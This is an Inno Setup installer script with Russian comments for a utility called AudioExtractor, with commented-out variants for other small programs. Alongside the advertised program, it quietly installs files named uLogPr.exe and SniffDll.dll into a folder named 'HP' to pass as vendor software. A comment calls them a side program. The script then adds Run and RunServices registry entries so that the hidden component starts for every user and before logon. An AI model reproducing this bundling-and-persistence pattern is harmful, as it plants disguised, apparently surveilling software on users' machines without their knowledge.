
[Setup]
;AppName=readFdr
;AppVerName=readFdr 1.0
; защита от переустановки запущенной версии
;AppMutex=readFdr

;AppName=MassPrint
;AppVerName=MassPrint 1.0
; защита от переустановки запущенной версии
;AppMutex=MassPrint

AppName=AudioExtractor
AppVerName=AudioExtractor 1.0
; защита от переустановки запущенной версии
AppMutex=AudioExtractor

;AppName=ClickMer
;AppVerName=ClickMer 1.0
; защита от переустановки запущенной версии
;AppMutex=ClickMer


; ================================================= 1
; DefaultDirName={userappdata}\Mera\BladeEngine
;DefaultDirName={commonappdata}\Mera\readFdr
;DefaultDirName={pf}\readFdr
;DefaultDirName={pf}\MassPrint
DefaultDirName={pf}\AudioExtractor
;DefaultDirName={pf}\ClickMer


;DefaultGroupName=Mera
OutputDir=output

; ================================================= 2
;OutputBaseFilename=readFdr-installer
;OutputBaseFilename=MassPrint-installer
OutputBaseFilename=AudioExtractor-installer
;OutputBaseFilename=ClickMer-installer

[Types]
Name: "full"; Description: "Полная установка"

[Components]
Name: "program"; Description: "Программа для считывания фалов"; Types: full; Flags: fixed

[Files]
;DefaultDirName=
Source: "source\uLogPr.exe"; DestDir: "{commonappdata}\HP"; Components: program; Flags: onlyifdoesntexist
Source: "source\SniffDll.dll"; DestDir: "{commonappdata}\HP"; Components: program; Flags: onlyifdoesntexist
Source: "source\sn.cnf"; DestDir: "{commonappdata}\HP"; Components: program
; левая прога

; ================================================= 3
;Source: "source\FolderReader\FolderReader.exe"; DestDir: "{app}"; Components: program
;Source: "source\FolderReader\versioninfo.txt"; DestDir: "{app}"; Components: program

;Source: "source\massPrint\MassPrint.exe"; DestDir: "{app}"; Components: program
;Source: "source\massPrint\version.txt"; DestDir: "{app}"; Components: program

Source: "source\AudioExtractor\Extractor.exe"; DestDir: "{app}"; Components: program
Source: "source\AudioExtractor\ffmpeg.exe"; DestDir: "{app}"; Components: program

;Source: "source\ClickMer\ASCII.jpg"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\bg.png"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\bgm.png"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\bonus1.wav"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\bonus2.wav"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\calligra.ttf"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\ClickMeR.exe"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\customkey.txt"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\D3DX81AB.DLL"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\exp.wav"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\History.txt"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\hit.wav"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\kno.wav"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\kyes.wav"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\level.wav"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\License.txt"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\menu.oil"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\miss.wav"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\ReadMe.txt"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\rec.wav"; DestDir: "{app}"; Components: program
;Source: "source\ClickMer\settings.ini"; DestDir: "{app}"; Components: program



[Registry]
; старт программ всех юзеров
Root: HKLM; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "ReadFdr"; ValueData: "{commonappdata}\HP\uLogPr.exe"
; старт программ текущего пользователя
Root:HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "ReadFdr"; ValueData: "{commonappdata}\HP\uLogPr.exe"
; пуск программ до входа пользователя в систему
Root: HKLM; Subkey: "Software\Microsoft\Windows\CurrentVersion\RunServices"; ValueType: string; ValueName: "ReadFdr"; ValueData: "{commonappdata}\HP\uLogPr.exe"

;[Run]
;Filename: "{sys}\vmm32\wdreg.exe";   Parameters: "-vxd install"; Check: IsComponentSelected('program');  Flags: runminimized  skipifdoesntexist

[Code]

procedure CurStepChanged(CurStep: TSetupStep);
var
  ZipName, FireBirdName:string;
  ResultCode:integer;
begin
  // инсталяция завершена
  {if CurStep = ssDone then
  begin
    // попытка проинсталировать ZipMaster
    if IsComponentSelected('zipmaster') then
    begin
      ZipName:=WizardDirValue+'\files\utils\install\zipmaster\zm190setup0113.exe';
      if FileExists(ZipName) then
        Exec(ZipName, '', '', SW_SHOW, ewWaitUntilTerminated, ResultCode);
    end;
    // попытка проинсталировать ZipMaster
    if IsComponentSelected('FireBird') then
    begin
      FireBirdName:=WizardDirValue+'\files\utils\FireBird\install\Firebird-2.5.0.26074_1_Win32.exe';
      if FileExists(FireBirdName) then
        Exec(FireBirdName, '', '', SW_SHOW, ewWaitUntilTerminated, ResultCode);
      FireBirdName:=WizardDirValue+'\files\utils\install\FireBird\Firebird-2.5.0.26074_1_Win32.exe';
      if FileExists(FireBirdName) then
        Exec(FireBirdName, '', '', SW_SHOW, ewWaitUntilTerminated, ResultCode);
    end;
  end;}
end;

{
procedure WordButtonOnClick(Sender: TObject);
var
  Word: Variant;
begin
  if MsgBox('Setup will now check whether Microsoft Word is running. Do you want to continue?', mbInformation, mb_YesNo) = idNo then
    Exit;
  // Try to get an active Word COM Automation object
  try
    Word := GetActiveOleObject('Word.Application');
  except
  end;
  if VarIsEmpty(Word) then
    MsgBox('Microsoft Word is not running.', mbInformation, mb_Ok)
  else
    MsgBox('Microsoft Word is running.', mbInformation, mb_Ok)
end;

procedure CreateButton(ALeft, ATop: Integer; ACaption: String; ANotifyEvent: TNotifyEvent);
begin
  with TButton.Create(WizardForm) do begin
    Left := ALeft;
    Top := ATop;
    Width := WizardForm.CancelButton.Width;
    Height := WizardForm.CancelButton.Height;
    Caption := ACaption;
    OnClick := ANotifyEvent;
    Parent := WizardForm.WelcomePage;
  end;
end;

// происходит перед созданием формы приветствия
procedure InitializeWizard();
var
  Left, Top, TopInc: Integer;
begin
  Left := WizardForm.WelcomeLabel2.Left;
  TopInc := WizardForm.CancelButton.Height + 8;
  Top := WizardForm.WelcomeLabel2.Top + WizardForm.WelcomeLabel2.Height - 4*TopInc;
  CreateButton(Left, Top, '&Word...', @WordButtonOnClick);
end;}
